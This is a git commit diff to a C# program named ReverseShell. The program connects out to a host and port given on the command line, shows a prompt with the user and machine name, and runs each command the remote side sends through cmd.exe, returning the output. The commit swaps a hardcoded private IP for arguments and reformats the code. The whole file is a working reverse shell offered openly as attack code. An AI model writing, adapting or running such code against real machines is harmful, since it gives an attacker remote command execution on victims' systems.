1d24cab0ec1653fa93206c565ce235e5cb915de2
Olivier LEUNG <olivierleung@hotmail.fr>
2023-04-07 08:48:38 +0200

    Add files via upload

--- Program.cs
+++ Program.cs
@@ -9,55 +9,65 @@ namespace ReverseShell
 {
     internal class Program
     {
-        public static void Main()
+        public static void Main(string[] args)
         {
-            var hostname = "192.168.80.134";
-            var port = 443;
+            if (args.Length < 2)
+            {
+                throw new ArgumentException("Error : Please specify hostname - port");
+            }
             
-            using (var tcp = new TcpClient())
+            string hostname = args[0];
+            int port = Convert.ToInt32(args[1]);
+            
+            using (var client = new TcpClient())
             {
                 //Connect to server
                 Console.WriteLine("[+] Connecting to tcp://{0}:{1}", hostname, port);
-                tcp.Connect(hostname, port);
+                client.Connect(hostname, port);
 
                 Console.WriteLine("[+] Opening stream");
-                using (var stream = tcp.GetStream())
+                using (var stream = client.GetStream())
                 {
                     string banner = "WELCOME TO TEHTRIS HELL !\r\n";
                     stream.Write(Encoding.ASCII.GetBytes(banner), 0, banner.Length);
-                    
+
                     Console.WriteLine("[+] Opening reading stream");
                     using (var streamReader = new StreamReader(stream))
-                    { 
+                    {
                         //As long as the client is connected to the server
-                        while (tcp.Connected)
+                        while (client.Connected)
                         {
                             string userName = Environment.UserName;
                             string systemName = Environment.MachineName;
                             var prompt = Encoding.ASCII.GetBytes(string.Format("{0}@{1} $ ", userName, systemName));
                             stream.Write(prompt, 0, prompt.Length);
-                                
+
                             string message = streamReader.ReadLine().TrimStart().TrimEnd();
                             if (message == "exit")
                             {
-                               break; //Leave while loop
+                                break; //Leave while loop
                             }
                             else
                             {
-                                string[] parts = message.Split(' '); //separate the command send by the server with space as delimiter
+                                string[]
+                                    parts = message
+                                        .Split(' '); //separate the command send by the server with space as delimiter
                                 string command = parts.First(); //first element of the array
                                 string[] arguments = parts.Skip(1).ToArray(); //args put in String array
                                 Console.WriteLine("[+] Executing " + command);
-                                string messageSrv = "Executing : " + command + " " + string.Join(" ", arguments) + "...\r\n";
+                                string messageSrv = "Executing : " + command + " " + string.Join(" ", arguments) +
+                                                    "...\r\n";
                                 stream.Write(Encoding.ASCII.GetBytes(messageSrv), 0, messageSrv.Length);
 
-                                ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe" , "/c " + command + " " +  string.Join(" ", arguments));
+                                ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe",
+                                    "/c " + command + " " + string.Join(" ", arguments));
                                 //startInfo.FileName = command;
                                 //startInfo.Arguments = string.Join(" ", arguments); //arguments is a string array, startInfo Arguments takes all the element of the array with a space delimiter
                                 startInfo.WorkingDirectory = @"C:\";
                                 startInfo.RedirectStandardError = true;
                                 startInfo.RedirectStandardOutput = true;
-                                startInfo.UseShellExecute = false; //true=ShellExecute(open specified program); false=CreateProcess
+                                startInfo.UseShellExecute =
+                                    false; //true=ShellExecute(open specified program); false=CreateProcess
 
                                 Process process = new Process();
                                 process.StartInfo = startInfo;
@@ -76,14 +86,17 @@ namespace ReverseShell
                                 }
                             }
                         }
+
                         Console.WriteLine("[!] Closing reading stream");
                         streamReader.Close();
                     }
+
                     Console.WriteLine("[!] Closing stream");
                     stream.Close();
                 }
+
                 Console.WriteLine("[!] Closing TCP Connection");
-                tcp.Close();
+                client.Close();
             }
         }
     }
